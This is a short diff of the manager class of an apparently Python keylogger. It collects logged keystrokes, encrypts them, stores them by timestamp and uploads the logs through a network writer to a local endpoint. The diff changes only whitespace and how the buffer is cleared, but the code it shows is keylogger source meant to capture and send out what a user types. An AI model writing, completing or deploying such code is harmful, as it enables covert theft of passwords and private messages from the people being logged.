@@ -7,6 +7,7 @@ from FileWriter import FileWriter
 from Encryptor import Encryptor
 from NetworkWriter import NetworkWriter
 
+
 class KeyLoggerManager:
     def __init__(self, secret_key):
         self.service = KeyLoggerService()
@@ -41,7 +42,7 @@ class KeyLoggerManager:
 
         if encrypted_data is not None:
             self.data_dic[timestamp] = {"key_data": encrypted_data}
-        self.service.buffer.flush()
+        self.service.list_data = []
         print(f"Added {len(logged_keys)} keys to the dictionary.")
 
     def save_locally(self):
@@ -61,6 +62,7 @@ class KeyLoggerManager:
             "logs": self.data_dic
         }
         self.network_writer.send_data(payload, "http://127.0.0.1:5000/upload")
+
 
 if __name__ == "__main__":
     secret_key = "your_secure_secret_key"
